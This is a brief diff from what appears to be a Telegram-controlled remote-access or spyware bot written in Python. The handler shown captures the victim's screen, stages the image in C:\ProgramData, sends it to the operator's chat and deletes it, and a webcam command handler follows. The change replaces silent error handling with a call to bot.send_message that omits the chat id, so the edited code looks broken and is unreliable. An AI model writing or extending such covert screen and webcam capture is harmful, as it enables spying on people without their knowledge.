@@ -400,8 +400,8 @@ def screen(command):
             bot.send_photo(command.chat.id, screen)
             screen.close()
             os.remove('C:\\ProgramData\\Screenshot.jpg')
-        except:
-            pass
+        except Exception as e:
+            bot.send_message(e)
 
 @bot.message_handler(commands=['Webcam', 'webcam'])
 def webcam(command):
